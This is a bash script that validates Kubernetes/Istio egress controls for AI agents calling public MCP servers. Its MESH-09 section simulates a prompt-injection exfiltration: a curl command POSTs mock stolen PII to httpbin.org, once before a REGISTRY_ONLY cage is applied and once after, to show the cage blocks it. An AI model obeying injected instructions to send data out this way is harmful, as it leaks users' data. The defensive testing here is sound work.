#!/usr/bin/env bash
# Phase 3 — Securing the Internet (Public MCP Servers): Interactive Validation
# Usage: KUBE_CONTEXT=cluster1-singtel ./POC-Success-Criteria/Phase3-Securing-the-Internet/validate.sh
set -euo pipefail

KC_CTX="${KUBE_CONTEXT:-cluster1}"
KC="kubectl --context ${KC_CTX}"
AGW_NS="agentgateway-system"

B='\033[1;34m'; G='\033[1;32m'; Y='\033[1;33m'
C='\033[1;36m'; M='\033[0;35m'; N='\033[0m'

pause() {
  echo -e "\n  ${B}─────────────────────────────────────────────────${N}"
  echo -e "  ${B}  ⏎  Press ENTER to continue...${N}"
  echo -e "  ${B}─────────────────────────────────────────────────${N}"
  read -rp "" _
  echo ""
}

step() {
  echo -e "\n ${M}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
  echo -e " ${M}  $*${N}"
  echo -e " ${M}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}\n"
}

show() {
  echo -e "\n  ${C}──────────────────────────────────────────────────────────${N}"
  echo -e "  ${C}  \$ $*${N}"
  echo -e "  ${C}──────────────────────────────────────────────────────────${N}\n"
}

ok()   { echo -e "  ${G}✅  $*${N}"; }
warn() { echo -e "  ${Y}⚠️   $*${N}"; }
note() { echo -e "\n  ${Y}📋  $*${N}"; }

echo ""
echo -e "${M}╔════════════════════════════════════════════════════════════╗${N}"
echo -e "${M}║   Phase 3 — Securing the Internet (Public MCP Servers)    ║${N}"
echo -e "${M}║   Cluster: ${KC_CTX}                                 ║${N}"
echo -e "${M}║   Tests: MESH-08 · MESH-09                                ║${N}"
echo -e "${M}╚════════════════════════════════════════════════════════════╝${N}"
echo ""
echo -e "  → Goal: prove that all agent traffic to public SaaS MCP tools"
echo -e "    flows through a centrally-managed egress gateway (single static IP),"
echo -e "    and that REGISTRY_ONLY policy prevents data exfiltration to"
echo -e "    unregistered destinations even under prompt injection."
echo ""
echo -e "  → MESH-09 applies and deletes a Sidecar resource. Net change: none."
pause

NETSHOOT=$(${KC} -n debug get pod -l app=netshoot \
  -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)
[[ -z "${NETSHOOT}" ]] && warn "No netshoot pod found — traffic tests will be skipped."

###############################################################################
# MESH-08 — Centralized SaaS Egress (Egress Gateway)
###############################################################################
step "MESH-08 — Centralized SaaS Egress (Egress Gateway)"
echo -e "  → All agent traffic to a registered public MCP server (e.g. Jira)"
echo -e "    is routed through a dedicated egress gateway."
echo -e "  → The SaaS vendor sees a single static IP — enabling simple IP allowlisting."
echo -e "  → Without this, each pod IP would be a different source IP."
pause

# 8.1 — Check for egress gateway deployment
show "${KC} -n istio-system get pod -l istio=egressgateway -o wide"
${KC} -n istio-system get pod -l istio=egressgateway -o wide 2>/dev/null \
  || true
show "${KC} -n istio-system get svc -l istio=egressgateway"
EGW=$(${KC} -n istio-system get svc -l istio=egressgateway \
  -o jsonpath='{.items[0].status.loadBalancer.ingress[0].hostname}{.items[0].status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)
if [[ -n "${EGW}" ]]; then
  ok "Egress gateway LB: ${EGW}"
  note "This is the single static IP that SaaS vendors add to their IP allowlists.
        All agent traffic to registered external tools exits through this address."
else
  warn "Egress gateway not found. Deploy with: istioctl install --set components.egressGateways[0].enabled=true"
  note "Without an egress gateway, each pod uses its own node IP as the source — making
        IP allowlisting impractical for enterprise SaaS vendors."
fi
pause

# 8.2 — Show the ServiceEntry + VirtualService routing traffic through egress GW
show "${KC} get serviceentry,virtualservice -n istio-system | grep -i egress"
${KC} get serviceentry -n istio-system 2>/dev/null \
  | grep -i "extern\|saas\|egress\|jira\|search" | head -10 \
  || echo "  (no egress-routed ServiceEntries found yet)"
note "A ServiceEntry + VirtualService combination routes registered SaaS hostnames
      through the egress gateway. The agent simply calls the registered tool URL;
      the gateway handles the routing and policy enforcement."
pause

# 8.3 — Demonstrate egress via the registered search.solo.io tool
if [[ -n "${NETSHOOT}" ]]; then
  show "curl from netshoot → search.solo.io/mcp (registered SaaS tool)"
  ${KC} -n debug exec "${NETSHOOT}" -- \
    curl -s --max-time 10 \
    -X POST \
    -H "Content-Type: application/json" \
    https://search.solo.io/mcp \
    -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26","capabilities":{},"clientInfo":{"name":"test","version":"1.0"}}}' \
    -o /dev/null \
    -w "  HTTP %{http_code}\n" || warn "Could not reach search.solo.io — check egress policy and DNS"
  note "A 200 response confirms the agent can reach the registered public MCP server.
        If an egress gateway is configured, ztunnel logs will show the traffic
        flowing through the egress gateway pod, not directly to the internet."
fi
pause

###############################################################################
# MESH-09 — Data Exfiltration Cage (REGISTRY_ONLY)
###############################################################################
step "MESH-09 — Data Exfiltration Cage (REGISTRY_ONLY)"
echo -e "  → Apply a Sidecar resource to the debug namespace restricting outbound"
echo -e "    traffic to registered mesh hosts only."
echo -e "  → Simulate a prompt injection attack: the agent is told to POST data"
echo -e "    to an unregistered external URL."
echo -e "  → The mesh drops the connection at Layer 4 — no data leaves."
echo -e "  → The Sidecar is deleted at the end. Net cluster change: none."
pause

# 9.1 — Show current outbound traffic policy
show "${KC} -n istio-system get cm istio -o jsonpath '{.data.mesh}' | grep outbound"
${KC} -n istio-system get cm istio \
  -o jsonpath='{.data.mesh}' 2>/dev/null \
  | grep -i outbound || echo "  (outboundTrafficPolicy not explicitly set — default: ALLOW_ANY)"
note "Default ALLOW_ANY permits agents to POST data anywhere. REGISTRY_ONLY restricts
      egress to registered ServiceEntry hosts — blocking prompt-injection exfiltration."
pause

# 9.2 — Baseline: an unregistered exfiltration URL is reachable (before cage)
if [[ -n "${NETSHOOT}" ]]; then
  show "curl from netshoot → httpbin.org/post (BEFORE cage — simulated data exfiltration)"
  ${KC} -n debug exec "${NETSHOOT}" -- \
    curl -s --max-time 5 \
    -X POST https://httpbin.org/post \
    -H "Content-Type: application/json" \
    -d '{"stolen":"customer_pii_data"}' \
    -o /dev/null \
    -w "  HTTP %{http_code}  (pre-cage — data LEFT the cluster)\n" || true
fi
pause

# 9.3 — Apply REGISTRY_ONLY cage via Sidecar resource
show "${KC} apply -f - (Sidecar: debug namespace — REGISTRY_ONLY egress cage)"
${KC} apply -f - <<'EOF'
apiVersion: networking.istio.io/v1
kind: Sidecar
metadata:
  name: demo-exfil-cage
  namespace: debug
spec:
  egress:
  - hosts:
    - ./*
    - istio-system/*
    - agentgateway-system/*
EOF
ok "REGISTRY_ONLY cage applied — waiting 3s for XDS propagation..."
sleep 3
note "Now only registered mesh hosts are reachable from debug namespace pods.
      Any attempt to POST to an unregistered URL is dropped at L4 by ztunnel
      before the TCP connection is established — the data never leaves the cluster."
pause

# 9.4 — Verify: exfiltration attempt is blocked
if [[ -n "${NETSHOOT}" ]]; then
  show "curl from netshoot → httpbin.org/post (WITH cage — expect blocked)"
  ${KC} -n debug exec "${NETSHOOT}" -- \
    curl -s --max-time 5 \
    -X POST https://httpbin.org/post \
    -H "Content-Type: application/json" \
    -d '{"stolen":"customer_pii_data"}' \
    -o /dev/null \
    -w "  HTTP %{http_code}  (should be 000 — ztunnel drops at L4)\n" || true
  note "HTTP 000 = connection never established. The data exfiltration attempt is
        silently dropped. This applies even if L7 guardrails (e.g. LLM output filters)
        are bypassed — the mesh cage is enforced independently at the transport layer."
fi
pause

# 9.5 — Cleanup
show "${KC} delete sidecar demo-exfil-cage -n debug"
${KC} delete sidecar demo-exfil-cage -n debug 2>/dev/null
ok "Cage Sidecar deleted — cluster restored to original state."
pause

###############################################################################
# Done
###############################################################################
echo ""
echo -e "${G}╔══════════════════════════════════════════════════════╗${N}"
echo -e "${G}║   Phase 3 validation complete ✅                    ║${N}"
echo -e "${G}║                                                      ║${N}"
echo -e "${G}║   MESH-08  Single-IP SaaS egress via egress gateway  ║${N}"
echo -e "${G}║   MESH-09  Prompt-injection exfiltration blocked      ║${N}"
echo -e "${G}╚══════════════════════════════════════════════════════╝${N}"
echo ""
